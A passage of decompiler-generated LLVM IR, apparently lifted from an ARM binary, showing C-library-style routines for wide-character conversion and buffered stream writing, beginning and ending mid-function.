  %v6_11584 = call i32 @function_11590(i8* %v5_11584, i32 %v1_11584, i32 -1, i32 %v0_1157c, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_11584
}

define i32 @function_11590(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11590:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11590 = load i32, i32* @r4, align 4
  store i32 %v3_11590, i32* %stack_var_-8, align 4
  %v10_11594 = icmp eq i32 %tmp, %arg2
  br i1 %v10_11594, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11590
  %v0_1159c1 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115b0

bb:                                               ; preds = %dec_label_pc_11590
  %v4_11598 = icmp eq i8* %arg1, null
  %v0_1159c = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_11598, label %dec_label_pc_115b0, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115b0:                               ; preds = %.thread, %bb
  %v1_115f0.ph = phi i32 [ %v0_1159c, %bb ], [ %v0_1159c1, %.thread ]
  %v2_115a03.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_115b0 = icmp eq i8* %arg1, null
  store i32 %v2_115a03.ph, i32* @ip, align 4
  br i1 %v3_115b0, label %.thread4, label %dec_label_pc_115e4

.thread4:                                         ; preds = %dec_label_pc_115b0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115c8:                               ; preds = %dec_label_pc_11604
  %v0_115c8 = call i32 @function_cec4()
  store i32 %v0_115c8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_115d4 = inttoptr i32 %v0_115c8 to i32*
  store i32 84, i32* %v2_115d4, align 4
  %v0_11640.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11640

dec_label_pc_115dc:                               ; preds = %dec_label_pc_11614
  %v3_11618 = zext i8 %v2_11618 to i32
  store i32 %v3_11618, i32* @lr, align 4
  br label %dec_label_pc_11634

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115b0
  store i32 %v2_115a03.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %bb27, %.thread4, %dec_label_pc_115e4
  %v1_115f020 = phi i32 [ %v0_1159c, %bb27 ], [ %v1_115f0.ph, %.thread4 ], [ %v1_115f0.ph, %dec_label_pc_115e4 ]
  %v2_1161414 = phi i32 [ %tmp, %bb27 ], [ %v2_115a03.ph, %.thread4 ], [ %v2_115a03.ph, %dec_label_pc_115e4 ]
  %v1_115ec = load i32, i32* @r3, align 4
  %v3_115ec = icmp uge i32 %v1_115f020, %v1_115ec
  %v1_115ec.v1_115f020 = select i1 %v3_115ec, i32 %v1_115ec, i32 %v1_115f020
  store i32 %v1_115ec.v1_115f020, i32* %r4.global-to-local, align 4
  %v1_115f8 = inttoptr i32 %arg2 to i32*
  %v2_115f8 = load i32, i32* %v1_115f8, align 4
  store i32 %v2_115f8, i32* @lr, align 4
  store i32 %v1_115ec.v1_115f020, i32* %r0.global-to-local, align 4
  %v2_1162c8 = icmp eq i32 %v1_115ec.v1_115f020, 0
  br i1 %v2_1162c8, label %dec_label_pc_11634, label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_115ec, %dec_label_pc_11624.dec_label_pc_11604_crit_edge
  %v2_11614 = phi i32 [ %v2_11624, %dec_label_pc_11624.dec_label_pc_11604_crit_edge ], [ %v2_1161414, %dec_label_pc_115ec ]
  %v0_1160c = phi i32 [ %v0_11604.pre, %dec_label_pc_11624.dec_label_pc_11604_crit_edge ], [ %v2_115f8, %dec_label_pc_115ec ]
  %v1_11604 = inttoptr i32 %v0_1160c to i32*
  %v2_11604 = load i32, i32* %v1_11604, align 4
  %v1_1160c = add i32 %v0_1160c, 4
  store i32 %v1_1160c, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_11604, 127
  br i1 %tmp36, label %dec_label_pc_115c8, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_11604
  %v1_11614 = trunc i32 %v2_11604 to i8
  %v3_11614 = inttoptr i32 %v2_11614 to i8*
  store i8 %v1_11614, i8* %v3_11614, align 1
  %v0_11618 = load i32, i32* @ip, align 4
  %v1_11618 = inttoptr i32 %v0_11618 to i8*
  %v2_11618 = load i8, i8* %v1_11618, align 1
  %v2_1161c = icmp eq i8 %v2_11618, 0
  br i1 %v2_1161c, label %dec_label_pc_115dc, label %dec_label_pc_11624

dec_label_pc_11624:                               ; preds = %dec_label_pc_11614
  %v1_11624 = load i32, i32* %r2.global-to-local, align 4
  %v2_11624 = add i32 %v1_11624, %v0_11618
  store i32 %v2_11624, i32* @ip, align 4
  %v0_11628 = load i32, i32* %r0.global-to-local, align 4
  %v1_11628 = add i32 %v0_11628, -1
  store i32 %v1_11628, i32* %r0.global-to-local, align 4
  %v2_1162c = icmp eq i32 %v1_11628, 0
  br i1 %v2_1162c, label %dec_label_pc_11634, label %dec_label_pc_11624.dec_label_pc_11604_crit_edge

dec_label_pc_11624.dec_label_pc_11604_crit_edge:  ; preds = %dec_label_pc_11624
  %v0_11604.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_11604

dec_label_pc_11634:                               ; preds = %dec_label_pc_11624, %dec_label_pc_115ec, %dec_label_pc_115dc
  %v0_11634 = phi i32 [ %v0_11618, %dec_label_pc_115dc ], [ %v2_1161414, %dec_label_pc_115ec ], [ %v2_11624, %dec_label_pc_11624 ]
  %v1_11634 = load i32, i32* @sp, align 4
  %v9_11634 = icmp eq i32 %v0_11634, %v1_11634
  br i1 %v9_11634, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_11634
  %v1_11638 = load i32, i32* @lr, align 4
  store i32 %v1_11638, i32* %v1_115f8, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11634, %bb30
  %v0_1163c = load i32, i32* %r0.global-to-local, align 4
  %v1_1163c = load i32, i32* %r4.global-to-local, align 4
  %v2_1163c = sub i32 %v1_1163c, %v0_1163c
  store i32 %v2_1163c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11640

dec_label_pc_11640:                               ; preds = %dec_label_pc_115c8, %bb31
  %v0_11640 = phi i32 [ %v0_11640.pre, %dec_label_pc_115c8 ], [ %v2_1163c, %bb31 ]
  store i32 %v0_11640, i32* %r0.global-to-local, align 4
  %v2_11648 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11648, i32* %r4.global-to-local, align 4
  ret i32 %v0_11640

; uselistorder directives
  uselistorder i32 %v0_11640, { 1, 0 }
  uselistorder i32 %v1_11628, { 1, 0 }
  uselistorder i32 %v2_11624, { 0, 2, 1 }
  uselistorder i32 %v2_11604, { 1, 0 }
  uselistorder i32 %v2_1161414, { 1, 0 }
  uselistorder i32 %v1_115f0.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 2, 1, 0 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11640, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11604, { 1, 0 }
  uselistorder label %dec_label_pc_115ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_115b0, { 1, 0 }
}

define i32 @function_1164c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1164c:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1164c = load i32, i32* @r4, align 4
  store i32 %v3_1164c, i32* %stack_var_-12, align 4
  %v6_1164c = load i32, i32* @r5, align 4
  %v9_1164c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1165c = call i32 @function_11158(i32 %arg1, i32 3)
  %v7_11660 = icmp eq i32 %v2_1165c, -1
  br i1 %v7_11660, label %dec_label_pc_1164c.dec_label_pc_1167c_crit_edge, label %dec_label_pc_11674

dec_label_pc_1164c.dec_label_pc_1167c_crit_edge:  ; preds = %dec_label_pc_1164c
  br label %dec_label_pc_1167c

dec_label_pc_11674:                               ; preds = %dec_label_pc_1164c
  %v0_11668 = load i32, i32* @r4, align 4
  %v0_11664 = load i32, i32* %r5.global-to-local, align 4
  %v2_11674 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11674, i32* @r4, align 4
  store i32 %v6_1164c, i32* @r5, align 4
  store i32 %v9_1164c, i32* @lr, align 4
  %v4_11678 = inttoptr i32 %v0_11664 to i8*
  %v5_11678 = call i32 @function_d498(i32 %v2_1165c, i8* %v4_11678, i32 0, i32 %v0_11668)
  br label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_1164c.dec_label_pc_1167c_crit_edge, %dec_label_pc_11674
  %v2_11680 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11680, i32* @r4, align 4
  store i32 %v6_1164c, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1165c, { 1, 0 }
  uselistorder i32 %v6_1164c, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_11158, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1167c, { 1, 0 }
}

define i32 @function_11684(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11684:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_116982 = icmp eq i32 %arg3, 0
  store i1 %v2_116982, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_116982, label %dec_label_pc_11738, label %dec_label_pc_116a4

dec_label_pc_11698thread-pre-split:               ; preds = %bb22
  %v3_116bc = load i32, i32* %r7.global-to-local, align 4
  %v5_116bc = add i32 %v3_116bc, %v4_116b0
  store i32 %v5_116bc, i32* %r7.global-to-local, align 4
  %v5_116c0 = sub i32 %v0_116b8, %v4_116b0
  store i32 %v5_116c0, i32* %r5.global-to-local, align 4
  %v2_11698 = icmp eq i32 %v5_116c0, 0
  store i1 %v2_11698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_116c0, i32* @r2, align 4
  br i1 %v2_11698, label %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge, label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11698thread-pre-split
  %v0_116a8 = phi i32 [ %v5_116bc, %dec_label_pc_11698thread-pre-split ], [ %arg2, %dec_label_pc_11684 ]
  %v0_116a4.in = phi i32 [ %v5_116c0, %dec_label_pc_11698thread-pre-split ], [ %arg3, %dec_label_pc_11684 ]
  %v0_116a4 = icmp slt i32 %v0_116a4.in, 0
  br i1 %v0_116a4, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_116a4
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_116a4, %bb
  %v0_116ac = load i32, i32* @r4, align 4
  %v1_116ac = add i32 %v0_116ac, 4
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_116a8 to i32*
  %v4_116b0 = call i32 @function_ce64(i32 %v3_116ac, i32* %tmp23)
  store i32 %v4_116b0, i32* %r0.global-to-local, align 4
  %v1_116b4 = icmp slt i32 %v4_116b0, 0
  %v2_116b4 = icmp eq i32 %v4_116b0, 0
  store i1 %v2_116b4, i1* %cpsr_z.global-to-local, align 1
  %v0_116b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116b8, i32* %r6.global-to-local, align 4
  br i1 %v1_116b4, label %dec_label_pc_116c8, label %dec_label_pc_11698thread-pre-split

dec_label_pc_116c8:                               ; preds = %bb22
  %v0_116c8 = load i32, i32* @r4, align 4
  %v1_116c8 = inttoptr i32 %v0_116c8 to i32*
  %v2_116c8 = load i32, i32* %v1_116c8, align 4
  store i32 %v2_116c8, i32* %r3.global-to-local, align 4
  %v1_116cc = add i32 %v0_116c8, 8
  store i32 %v1_116cc, i32* %r0.global-to-local, align 4
  %v1_116d0 = inttoptr i32 %v1_116cc to i32*
  %v2_116d0 = load i32, i32* %v1_116d0, align 4
  store i32 %v2_116d0, i32* %r0.global-to-local, align 4
  %v3_116d0 = add i32 %v0_116c8, 12
  %v4_116d0 = inttoptr i32 %v3_116d0 to i32*
  %v5_116d0 = load i32, i32* %v4_116d0, align 4
  %v1_116d4 = or i32 %v2_116c8, 8
  store i32 %v1_116d4, i32* %r3.global-to-local, align 4
  %v3_116d8 = sdiv i32 %v2_116c8, 256
  %v2_116dc = sub i32 %v5_116d0, %v2_116d0
  store i32 %v2_116dc, i32* %r2.global-to-local, align 4
  %v9_116dc = icmp eq i32 %v5_116d0, %v2_116d0
  store i1 %v9_116dc, i1* %cpsr_z.global-to-local, align 1
  %v1_116e0 = trunc i32 %v3_116d8 to i8
  %v3_116e0 = add i32 %v0_116c8, 1
  %v4_116e0 = inttoptr i32 %v3_116e0 to i8*
  store i8 %v1_116e0, i8* %v4_116e0, align 1
  %v0_116e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_116e4 = trunc i32 %v0_116e4 to i8
  %v2_116e4 = load i32, i32* @r4, align 4
  %v3_116e4 = inttoptr i32 %v2_116e4 to i8*
  store i8 %v1_116e4, i8* %v3_116e4, align 1
  %v0_116e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_116e8, label %dec_label_pc_116c8.dec_label_pc_11734_crit_edge, label %dec_label_pc_116ec

dec_label_pc_116c8.dec_label_pc_11734_crit_edge:  ; preds = %dec_label_pc_116c8
  %v0_11734.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11734

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116c8
  %v0_116ec = load i32, i32* %r2.global-to-local, align 4
  %v1_116ec = load i32, i32* %r5.global-to-local, align 4
  %v9_116ec = icmp eq i32 %v0_116ec, %v1_116ec
  store i1 %v9_116ec, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_116ec, %v1_116ec
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_116ec
  store i32 %v0_116ec, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_116ec, %bb24
  %v0_116f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_116f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_11718
  %v2_116f8 = phi i32 [ %v2_116f8.pre, %.preheader ], [ %v1_1171c, %dec_label_pc_11718 ]
  %v0_116f4 = phi i32 [ %v0_116f4.pre, %.preheader ], [ %v1_11704, %dec_label_pc_11718 ]
  %v1_116f4 = inttoptr i32 %v0_116f4 to i8*
  %v2_116f4 = load i8, i8* %v1_116f4, align 1
  %v3_116f4 = zext i8 %v2_116f4 to i32
  store i32 %v3_116f4, i32* %r3.global-to-local, align 4
  %v3_116f8 = inttoptr i32 %v2_116f8 to i8*
  store i8 %v2_116f4, i8* %v3_116f8, align 1
  %v0_116fc = load i32, i32* %r0.global-to-local, align 4
  %v1_116fc = inttoptr i32 %v0_116fc to i8*
  %v2_116fc = load i8, i8* %v1_116fc, align 1
  %v3_116fc = zext i8 %v2_116fc to i32
  store i32 %v3_116fc, i32* %r3.global-to-local, align 4
  %v7_11700 = icmp eq i8 %v2_116fc, 10
  store i1 %v7_11700, i1* %cpsr_z.global-to-local, align 1
  %v0_11704 = load i32, i32* %r7.global-to-local, align 4
  %v1_11704 = add i32 %v0_11704, 1
  store i32 %v1_11704, i32* %r7.global-to-local, align 4
  br i1 %v7_11700, label %dec_label_pc_1170c, label %dec_label_pc_11718

dec_label_pc_1170c:                               ; preds = %bb25
  %v0_1170c = load i32, i32* @r4, align 4
  %v1_1170c = add i32 %v0_1170c, 1
  %v2_1170c = inttoptr i32 %v1_1170c to i8*
  %v3_1170c = load i8, i8* %v2_1170c, align 1
  %v4_1170c = zext i8 %v3_1170c to i32
  store i32 %v4_1170c, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_1170c, 2
  %v2_11710 = icmp eq i8 %tmp30, 0
  store i1 %v2_11710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11710, label %dec_label_pc_11718, label %dec_label_pc_11724

dec_label_pc_11718:                               ; preds = %dec_label_pc_1170c, %bb25
  %v0_11718 = load i32, i32* %r6.global-to-local, align 4
  %v1_11718 = add i32 %v0_11718, -1
  store i32 %v1_11718, i32* %r6.global-to-local, align 4
  %v7_11718 = icmp eq i32 %v0_11718, 1
  store i1 %v7_11718, i1* %cpsr_z.global-to-local, align 1
  %v1_1171c = add i32 %v0_116fc, 1
  store i32 %v1_1171c, i32* %r0.global-to-local, align 4
  br i1 %v7_11718, label %dec_label_pc_11718.dec_label_pc_11724_crit_edge, label %bb25

dec_label_pc_11718.dec_label_pc_11724_crit_edge:  ; preds = %dec_label_pc_11718
  %v0_11724.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11724

dec_label_pc_11724:                               ; preds = %dec_label_pc_1170c, %dec_label_pc_11718.dec_label_pc_11724_crit_edge
  %v0_11728 = phi i32 [ %v1_1171c, %dec_label_pc_11718.dec_label_pc_11724_crit_edge ], [ %v0_116fc, %dec_label_pc_1170c ]
  %v0_11724 = phi i32 [ %v0_11724.pre, %dec_label_pc_11718.dec_label_pc_11724_crit_edge ], [ %v0_1170c, %dec_label_pc_1170c ]
  %v1_11724 = add i32 %v0_11724, 8
  %v2_11724 = inttoptr i32 %v1_11724 to i32*
  %v3_11724 = load i32, i32* %v2_11724, align 4
  store i32 %v3_11724, i32* %r3.global-to-local, align 4
  %v2_11728 = add i32 %v0_11724, 16
  %v3_11728 = inttoptr i32 %v2_11728 to i32*
  store i32 %v0_11728, i32* %v3_11728, align 4
  %v0_1172c = load i32, i32* %r3.global-to-local, align 4
  %v1_1172c = load i32, i32* %r0.global-to-local, align 4
  %v2_1172c = sub i32 %v1_1172c, %v0_1172c
  store i32 %v2_1172c, i32* %r3.global-to-local, align 4
  %v1_11730 = load i32, i32* %r5.global-to-local, align 4
  %v2_11730 = sub i32 %v1_11730, %v2_1172c
  store i32 %v2_11730, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11734

dec_label_pc_11734:                               ; preds = %dec_label_pc_116c8.dec_label_pc_11734_crit_edge, %dec_label_pc_11724
  %v0_11734 = phi i32 [ %v0_11734.pre, %dec_label_pc_116c8.dec_label_pc_11734_crit_edge ], [ %v2_11730, %dec_label_pc_11724 ]
  %v1_11734 = load i32, i32* %r8.global-to-local, align 4
  %v2_11734 = sub i32 %v1_11734, %v0_11734
  store i32 %v2_11734, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11738

dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge: ; preds = %dec_label_pc_11698thread-pre-split
  %v0_11738.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge, %dec_label_pc_11734
  %v0_11738 = phi i32 [ %v2_11734, %dec_label_pc_11734 ], [ %v0_11738.pre.pre, %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge ], [ 0, %dec_label_pc_11684 ]
  store i32 %v0_11738, i32* %r0.global-to-local, align 4
  ret i32 %v0_11738

; uselistorder directives
  uselistorder i32 %v0_11738, { 1, 0 }
  uselistorder i32 %v0_11724, { 1, 0 }
  uselistorder i32 %v1_1171c, { 0, 2, 1 }
  uselistorder i32 %v0_11718, { 1, 0 }
  uselistorder i1 %v2_11710, { 1, 0 }
  uselistorder i32 %v1_11704, { 1, 0 }
  uselistorder i32 %v0_116ec, { 1, 0, 2 }
  uselistorder i32 %v5_116d0, { 1, 0 }
  uselistorder i32 %v2_116d0, { 1, 0, 2 }
  uselistorder i32 %v0_116b8, { 1, 0 }
  uselistorder i32 %v4_116b0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_116c0, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 3, 2, 5, 4, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 4, 2, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_ce64, { 1, 0 }
  uselistorder label %dec_label_pc_11738, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11734, { 1, 0 }
  uselistorder label %dec_label_pc_11724, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_116a4, { 1, 0 }
}

define i32 @function_11740(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11740:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11740 = load i32, i32* @r4, align 4
  store i32 %v3_11740, i32* %stack_var_-20, align 4
  %v6_11740 = load i32, i32* @r5, align 4
  %v9_11740 = load i32, i32* @r6, align 4
  %v12_11740 = load i32, i32* @r7, align 4
  %v15_11740 = load i32, i32* @lr, align 4
  %v1_11744 = add i32 %arg3, 1
  %v2_11744 = inttoptr i32 %v1_11744 to i8*
  %v3_11744 = load i8, i8* %v2_11744, align 1
  %v4_11744 = zext i8 %v3_11744 to i32
  %v3_11748 = mul nuw nsw i32 %v4_11744, 256
  %v1_1174c = and i32 %v3_11748, 512
  store i32 %v1_1174c, i32* @r4, align 4
  %v2_1174c = icmp eq i32 %v1_1174c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1174c, label %dec_label_pc_11760, label %dec_label_pc_1185c

dec_label_pc_11760:                               ; preds = %dec_label_pc_11740
  %v1_11760 = add i32 %arg3, 4
  %v2_11760 = inttoptr i32 %v1_11760 to i32*
  %v3_11760 = load i32, i32* %v2_11760, align 4
  %v1_11768 = add i32 %arg3, 16
  %v2_11768 = inttoptr i32 %v1_11768 to i32*
  %v3_11768 = load i32, i32* %v2_11768, align 4
  store i32 %v3_11768, i32* @r0, align 4
  %v1_1176c = add i32 %arg3, 12
  %v2_1176c = inttoptr i32 %v1_1176c to i32*
  %v3_1176c = load i32, i32* %v2_1176c, align 4
  %v4_11770 = icmp eq i32 %v3_11760, -2
  %v2_11774 = sub i32 %v3_1176c, %v3_11768
  br i1 %v4_11770, label %dec_label_pc_11774, label %dec_label_pc_1179c

dec_label_pc_11774:                               ; preds = %dec_label_pc_11760
  %v3_11778 = icmp ugt i32 %v2_11774, %arg2
  br i1 %v3_11778, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_11774
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_11774, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_11774, %dec_label_pc_11774 ]
  %v0_11780 = phi i32 [ %arg2, %bb ], [ %v2_11774, %dec_label_pc_11774 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_11780, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_11788 = call i32 @function_ef60()
  %v0_1178c = load i32, i32* @r5, align 4
  %v1_1178c = add i32 %v0_1178c, 16
  %v2_1178c = inttoptr i32 %v1_1178c to i32*
  %v3_1178c = load i32, i32* %v2_1178c, align 4
  %v1_11790 = load i32, i32* @r4, align 4
  %v2_11790 = add i32 %v1_11790, %v3_1178c
  store i32 %v2_11790, i32* %v2_1178c, align 4
  br label %dec_label_pc_11870

dec_label_pc_1179c:                               ; preds = %dec_label_pc_11760
  %tmp = icmp ult i32 %v2_11774, %arg2
  br i1 %tmp, label %dec_label_pc_1183c, label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_1179c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_117b0 = call i32 @function_ef60()
  %v0_117b4 = load i32, i32* @r5, align 4
  %v1_117b4 = add i32 %v0_117b4, 16
  %v2_117b4 = inttoptr i32 %v1_117b4 to i32*
  %v3_117b4 = load i32, i32* %v2_117b4, align 4
  %v1_117b8 = add i32 %v0_117b4, 1
  %v2_117b8 = inttoptr i32 %v1_117b8 to i8*
  %v3_117b8 = load i8, i8* %v2_117b8, align 1
  %v1_117bc = load i32, i32* @r6, align 4
  %v2_117bc = add i32 %v1_117bc, %v3_117b4
  %tmp17 = urem i8 %v3_117b8, 2
  %v2_117c0 = icmp eq i8 %tmp17, 0
  store i32 %v2_117bc, i32* %v2_117b4, align 4
  br i1 %v2_117c0, label %dec_label_pc_11870, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %dec_label_pc_117a8
  %v0_117cc = load i32, i32* %r7.global-to-local, align 4
  %v0_117d4 = load i32, i32* @r6, align 4
  %v4_117d8 = call i32 @function_128c4(i32 %v0_117cc, i32 10, i32 %v0_117d4, i32 %v2_117bc)
  %v2_117dc = icmp eq i32 %v4_117d8, 0
  br i1 %v2_117dc, label %dec_label_pc_11870, label %dec_label_pc_117e4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_117cc
  %v0_117e4 = load i32, i32* @r5, align 4
  store i32 %v0_117e4, i32* @r0, align 4
  %v0_117e8 = call i32 @function_d8c8()
  %v2_117ec = icmp eq i32 %v0_117e8, 0
  br i1 %v2_117ec, label %dec_label_pc_11870, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117e4
  %v0_117f4 = load i32, i32* @r6, align 4
  %v3_117f4 = icmp uge i32 %v0_117f4, %v0_117e8
  %v0_117e8.v0_117f4 = select i1 %v3_117f4, i32 %v0_117e8, i32 %v0_117f4
  store i32 %v0_117e8.v0_117f4, i32* @r4, align 4
  %v2_11800 = sub i32 %v0_117f4, %v0_117e8.v0_117f4
  %v0_11804 = load i32, i32* %r7.global-to-local, align 4
  %v2_11804 = add i32 %v0_11804, %v2_11800
  store i32 %v2_11804, i32* %r7.global-to-local, align 4
  store i32 %v0_117e8.v0_117f4, i32* @r2, align 4
  %v4_11814 = call i32 @function_127b0(i32 %v2_11804, i32 10, i32 %v0_117e8.v0_117f4, i32 %v2_11800)
  %v2_11818 = icmp eq i32 %v4_11814, 0
  br i1 %v2_11818, label %dec_label_pc_11870, label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_117f4
  %v0_11820 = load i32, i32* @r5, align 4
  %v1_11820 = add i32 %v0_11820, 16
  %v2_11820 = inttoptr i32 %v1_11820 to i32*
  %v3_11820 = load i32, i32* %v2_11820, align 4
  %v0_11824 = load i32, i32* %r7.global-to-local, align 4
  %v1_11824 = load i32, i32* @r4, align 4
  %v2_11824 = sub i32 %v0_11824, %v4_11814
  %v2_11828 = add i32 %v2_11824, %v1_11824
  %v2_1182c = sub i32 %v3_11820, %v2_11828
  %v1_11830 = load i32, i32* @r6, align 4
  %v2_11830 = sub i32 %v1_11830, %v2_11828
  store i32 %v2_11830, i32* @r6, align 4
  store i32 %v2_1182c, i32* %v2_11820, align 4
  br label %dec_label_pc_11870

dec_label_pc_1183c:                               ; preds = %dec_label_pc_1179c
  %v1_1183c = add i32 %arg3, 8
  %v2_1183c = inttoptr i32 %v1_1183c to i32*
  %v3_1183c = load i32, i32* %v2_1183c, align 4
  %v9_11840 = icmp eq i32 %v3_11768, %v3_1183c
